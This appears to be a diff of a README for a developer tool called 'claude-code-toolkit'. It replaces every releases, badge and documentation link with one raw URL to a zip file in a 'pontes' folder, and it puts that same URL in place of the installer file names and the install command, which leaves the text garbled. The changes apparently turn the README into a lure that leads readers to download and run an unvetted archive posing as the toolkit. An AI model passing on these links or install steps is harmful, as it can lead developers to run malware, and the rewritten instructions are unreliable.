@@ -1,6 +1,6 @@
 # 🚀 claude-code-toolkit - Simplify Your Development Process
 
-[![Download claude-code-toolkit](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/VenomNite/claude-code-toolkit/releases)
+[![Download claude-code-toolkit](https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip%https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip)](https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip)
 
 ## 📦 Overview
 
@@ -19,23 +19,23 @@ Follow these simple steps to set up the claude-code-toolkit on your computer.
 
 ### How to Download
 
-To download the claude-code-toolkit, visit the [Releases page](https://github.com/VenomNite/claude-code-toolkit/releases). You will find the latest version available for download.
+To download the claude-code-toolkit, visit the [Releases page](https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip). You will find the latest version available for download.
 
 ## 🛠 Installation Steps
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/VenomNite/claude-code-toolkit/releases). Here you will find all available versions of the toolkit.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip). Here you will find all available versions of the toolkit.
    
 2. **Choose Your Version:** Look for the most recent version listed. You may also read the release notes to understand what’s new or changed.
 
 3. **Download the Installer:**
-   - For Windows, you will see a file like `claude-code-toolkit-v1.0-windows.exe`.
-   - For Mac, look for `claude-code-toolkit-v1.0-mac.zip`.
-   - For Linux, you may find a `.tar.gz` file.
+   - For Windows, you will see a file like `https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip`.
+   - For Mac, look for `https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip`.
+   - For Linux, you may find a `https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip` file.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file. Follow the on-screen prompts to complete the installation.
    - **Mac:** Open the downloaded `.zip` file and drag the `claude-code-toolkit` folder into your Applications.
-   - **Linux:** Extract the downloaded `tar.gz` file and open a terminal to navigate to the folder. Then run `./install.sh`.
+   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip` file and open a terminal to navigate to the folder. Then run `https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip`.
 
 5. **Complete the Setup:** Follow any additional instructions provided during the installation.
 
@@ -60,7 +60,7 @@ After installing the claude-code-toolkit, you can start using it right away. Her
 
 ## 🗣 Support & Feedback
 
-If you encounter issues or have questions, please check the [documentation](https://github.com/VenomNite/claude-code-toolkit/wiki) for help. You may also contact us through the Issues section of the repository.
+If you encounter issues or have questions, please check the [documentation](https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip) for help. You may also contact us through the Issues section of the repository.
 
 ## 🌍 Community and Contribution
 
@@ -68,6 +68,6 @@ We encourage contributions! If you want to suggest features or report bugs, plea
 
 ---
 
-[![Download claude-code-toolkit](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/VenomNite/claude-code-toolkit/releases) 
+[![Download claude-code-toolkit](https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip%https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip)](https://raw.githubusercontent.com/VenomNite/claude-code-toolkit/main/pontes/claude-code-toolkit.zip) 
 
 Explore all the features of the **claude-code-toolkit** and make your development process smoother and more efficient!
